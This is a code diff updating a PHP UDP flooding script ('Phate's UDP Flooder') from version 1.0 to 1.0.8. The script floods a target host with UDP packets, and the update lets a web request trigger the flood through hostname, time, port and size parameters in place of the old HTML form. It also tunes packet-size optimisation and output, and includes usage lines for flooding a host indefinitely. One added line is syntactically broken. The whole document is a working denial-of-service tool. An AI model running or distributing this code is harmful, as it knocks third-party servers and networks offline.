@@ -1,6 +1,6 @@
 <?php
 /*
-PUF: Phate's UDP Flooder V1.0
+PUF: Phate's UDP Flooder V1.0.8
 
 More info/latest version: 
 https://github.com/udp-flooder/puf
@@ -27,13 +27,13 @@ IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
 CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */
 
-$file = end(explode(DIRECTORY_SEPARATOR, __FILE__)); $cache = true; $cacheData = array();
+$version = '1.0.8'; $file = end(explode(DIRECTORY_SEPARATOR, __FILE__)); $cache = true; $cacheData = array();
 
 // Determine web/CLI
 if (defined('PHP_SAPI') || function_exists('php_sapi_name')) {
     if (PHP_SAPI == 'cli' || php_sapi_name() == 'cli') {
-        echo '========================' . PHP_EOL;
-        echo 'Phate\'s UDP Flooder V1.0' . PHP_EOL;
+        echo '===========================' . PHP_EOL;
+        echo 'Phate\'s UDP Flooder V' . $version . PHP_EOL;
         $cli = true;
         $args = $_SERVER['argv'];
         if ($_SERVER['argc'] == 1 || $args[1] == '-h' || $args[1] == '-help') {
@@ -47,6 +47,7 @@ if (defined('PHP_SAPI') || function_exists('php_sapi_name')) {
             echo $file . ' host.io 0 0 35000 (floods host on random port with fixed packet-size, disabling optimised speed, indefinitly)' . PHP_EOL;
             echo $file . ' host.io -nocache (optimised speed without cache)' . PHP_EOL;
             echo $file . ' -showcache (shows optimised speed/from cache)' . PHP_EOL;
+            echo '===========================' . PHP_EOL;
             exit(0);
         }
     }
@@ -54,7 +55,6 @@ if (defined('PHP_SAPI') || function_exists('php_sapi_name')) {
 if (!isset($cli)) {
     set_time_limit(0);
     $cli = false;
-    $args = $_REQUEST;
 }
 
 if ($cli) {
@@ -72,12 +72,8 @@ if ($cli) {
     }
 }   
 else {
-    echo '<doctype html><html><head><title>PUF: Phate\'s UDP Flooder V1.0</title><meta charset="UTF-8"></head><body><h1>PUF: Phate\'s UDP Flooder</h1><form method="post">';
     if (isset($args['nocache']) && $args['nocache'] == 'yes') {
         $cache = false;
-    }
-    else if (isset($args['showcache'])) {
-        echo '<strong>Cache</strong><br /><pre>' . $_SESSION['pufpackets'] . PHP_EOL . $_SESSION['pufspeed'] . '</pre><hr /><pre>';
     }
 }
 
@@ -90,6 +86,22 @@ if (file_exists($file . '.dat')) {
 }
 else if (isset($_SESSION['pufsize'])) {
     $cacheData[] = $_SESSION['pufsize'];
+}
+
+if (!$cli) {
+    $args = array();
+    if (isset($_REQUEST['hostname'])) {
+        $args[1] = $_REQUEST['hostname'];
+    }
+    if (isset($_REQUEST['time'])) {
+        $args[2] = $_REQUEST['time'];
+    }
+    if (isset($_REQUEST['port'])) {
+        $args[3] = $_REQUEST['port'];
+    }
+    if (isset($_REQUEST['size'])) {
+        $args[4] = $_REQUEST['size'];
+    }
 }
 
 if (count($args) >= 2) {
@@ -110,7 +122,7 @@ if (count($args) >= 2) {
     while (true) {
         $time = (time() - $strt);
         if (time() >= $mxtm) {
-            echo $pcks . " sent   \t" . round($pcks / $time, 2) . "/s   \t" . @round(((($pcks * $size) / 1024) / 1024) / $time, 2) . "mB/s   " . PHP_EOL;
+            echo str_pad(@round($pcks / $time, 2), 15) . "p/s     \t" . str_pad(@round(((($pcks * $size) / 1024) / 1024) / $time, 2), 7) . "MB/s    \t " . str_pad(($mxtm - time()), 5) ." seconds left    " . PHP_EOL;
             break;
         }
         $pcks++;
@@ -124,29 +136,13 @@ if (count($args) >= 2) {
             fclose($fp);
         }
         if ($last != time()) {
-            echo @round($pcks / $time, 2) . "p/s     \t" . @round(((($pcks * $size) / 1024) / 1024) / $time, 2) . "mB/s    \t " . ($mxtm - time()) ." seconds left    \r";
+            echo str_pad(@round($pcks / $time, 2), 15) . "p/s     \t" . str_pad(@round(((($pcks * $size) / 1024) / 1024) / $time, 2), 7) . "MB/s    \t " . str_pad(($mxtm - time()), 5) ." seconds left    \r";
             $last = time();
         }
     }
     if ($cli) {
-        exit(PHP_EOL . '========================');
+        exit(PHP_EOL . '===========================' . PHP_EOL);
     }
-}
-
-if (!$cli) {
-    echo '</pre>
-    <label for="host">Host</label><br />
-    <input type="text" name="host" value="' . (isset($args[1]) ? htmlentities($args[1]) : '') . '" /><br />
-    <label for="time">Time</label><br />
-    <input type="text" name="time" value="' . (isset($args[2]) ? intval($args[2]) : 300) . '" /><br />
-    <label for="port">Port</label><br />
-    <input type="text" name="port" value="' . (isset($args[3]) ? intval($args[3]) : '') . '"/><br />
-    <label for="size">Size (Optimised/Custom)</label><br />
-    <input type="text" name="size" value="' . (isset($args[4]) ? intval($args[4]) : '') . '" /><br />
-    <label for="cache">Cache</label><br />
-    <input type="checkbox" name="cache" value="yes" ' . ($cache ? 'checked="checked"' : '') . ' /><br />
-    <input type="submit" value="FloodIT!" /> &nbsp; <input type="submit" name="showcache" value="Show cache" />
-    </form></body></html>';
 }
 
 function getSize() {
@@ -162,7 +158,7 @@ function getSize() {
             return $_SESSION['pufsize'];
         }
     }
-    
+    echo '['
     $size = 5000;
     $speed = '?';
     $bestsize = 0;
@@ -191,19 +187,19 @@ function getSize() {
             $bestsize = $size;
             $bestpackets = $packets;
         }
-        sleep(5);
+        sleep(1);
         $size += 5000;
     }
     
     if ($cli) {
         $fp = @fopen(str_replace('php', 'dat', $file), 'W');
         if (!$fp) {
-            echo '[WARNING] Cache file could not be created. Optimised size is ' . $size . ' at ' . $speed . ' mB/s' . PHP_EOL;
+            echo '[WARNING] Cache file could not be created. Optimised size is ' . $bestsize . ' at ' . $toBeat . ' MB/s' . PHP_EOL;
         }
         else {
-            $fw = fwrite($fp, $size . '; packets per request' . PHP_EOL . $speed . '; mB/s');
+            $fw = fwrite($fp, $bestsize . '; packets per request' . PHP_EOL . $toBeat . '; MB/s');
             if (!$fw) {
-                echo '[WARNING] Could not write to cache file. Optimised size is ' . $size . ' at ' . $speed . ' mB/s' . PHP_EOL;
+                echo '[WARNING] Could not write to cache file. Optimised size is ' . $bestsize . ' at ' . $toBeat . ' MB/s' . PHP_EOL;
             }
             fclose($fp);
         }
